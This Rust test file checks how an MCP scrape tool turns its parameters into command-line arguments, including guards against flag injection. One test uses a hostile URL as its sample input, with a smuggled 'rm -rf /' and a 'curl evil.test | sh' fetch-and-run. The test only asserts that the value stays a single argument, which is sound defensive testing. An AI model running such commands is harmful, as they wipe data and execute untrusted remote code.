//! Source-site scrape parameters → argv, in contract order, and its own guards.
mod common;
use common::args::scrape_params;

use serde_json::json;
use stencil_mcp::args::build_scrape_argv;

#[test]
fn scrape_minimal_defaults_output_to_cwd() {
    // With only the required URL, the destination directory defaults to ".".
    let p = scrape_params(json!({ "source_site": "https://example.com/" }));
    assert_eq!(
        build_scrape_argv(&p).unwrap(),
        ["--source-site", "https://example.com/", "."]
    );
}

#[test]
fn scrape_all_flags_map_in_contract_order() {
    let p = scrape_params(json!({
        "source_site": "https://example.com/gallery",
        "output": "downloads",
        "count": 5,
        "group": 2,
        "filter": "img|background",
        "format": "png|jpg|webp",
        "name": "cat.*\\.jpg",
        "min_width": 100,
        "max_width": 2000,
        "min_height": 80,
        "max_height": 1500
    }));
    assert_eq!(
        build_scrape_argv(&p).unwrap(),
        [
            "--source-site",
            "https://example.com/gallery",
            "--source-count",
            "5",
            "--group",
            "2",
            "--source-filter",
            "img|background",
            "--source-format",
            "png|jpg|webp",
            "--source-name",
            "cat.*\\.jpg",
            "--source-min-width",
            "100",
            "--source-max-width",
            "2000",
            "--source-min-height",
            "80",
            "--source-max-height",
            "1500",
            "downloads"
        ]
    );
}

#[test]
fn scrape_omitted_optionals_are_absent() {
    // Optional flags are only emitted when set — no zero-valued bounds leak into argv.
    let p = scrape_params(json!({ "source_site": "https://x/", "output": "out", "count": 3 }));
    assert_eq!(
        build_scrape_argv(&p).unwrap(),
        ["--source-site", "https://x/", "--source-count", "3", "out"]
    );
}

#[test]
fn scrape_empty_source_site_is_rejected() {
    for bad in ["", "   "] {
        let p = scrape_params(json!({ "source_site": bad, "output": "out" }));
        let err = build_scrape_argv(&p).unwrap_err().to_string();
        assert!(err.contains("source_site"), "{bad:?} got: {err}");
    }
}

#[test]
fn scrape_dash_leading_output_is_rejected_no_flag_injection() {
    // The output directory rides the positional slot; a dash-leading value would misparse as
    // a scrape flag (`--source-count` would even swallow the next token), so reject it.
    for bad in ["--source-count", "-c", "--source-filter", "-"] {
        let p = scrape_params(json!({ "source_site": "https://x/", "output": bad }));
        let err = build_scrape_argv(&p).unwrap_err().to_string();
        assert!(
            err.contains("must not start with '-'"),
            "output {bad:?} should be rejected, got: {err}"
        );
    }
}

#[test]
fn scrape_hostile_url_stays_one_argv_token() {
    // No shell is involved; a hostile URL rides as exactly one token after `--source-site`.
    let hostile = "https://x/?a=1; rm -rf / && curl evil.test | sh";
    let p = scrape_params(json!({ "source_site": hostile, "output": "out" }));
    let argv = build_scrape_argv(&p).unwrap();
    let i = argv.iter().position(|a| a == "--source-site").unwrap();
    assert_eq!(argv[i + 1], hostile);
    assert_eq!(argv.iter().filter(|a| *a == hostile).count(), 1);
}

#[test]
fn scrape_surface_defaults_or_explicit_cli_ok() {
    // No surface, or an explicit `cli`, is accepted; scraping only writes files locally.
    let p = scrape_params(json!({ "source_site": "https://x/", "output": "out" }));
    assert!(p.validate_surface().is_ok());
    let p = scrape_params(json!({ "source_site": "https://x/", "output": "out", "surface": "cli" }));
    assert!(p.validate_surface().is_ok());
}

#[test]
fn scrape_non_cli_surface_is_rejected() {
    for bad in [json!("browser"), json!("desktop"), json!(["cli", "browser"])] {
        let p =
            scrape_params(json!({ "source_site": "https://x/", "output": "out", "surface": bad }));
        let err = p.validate_surface().unwrap_err();
        assert!(err.contains("only supports the `cli` surface"), "got: {err}");
    }
}
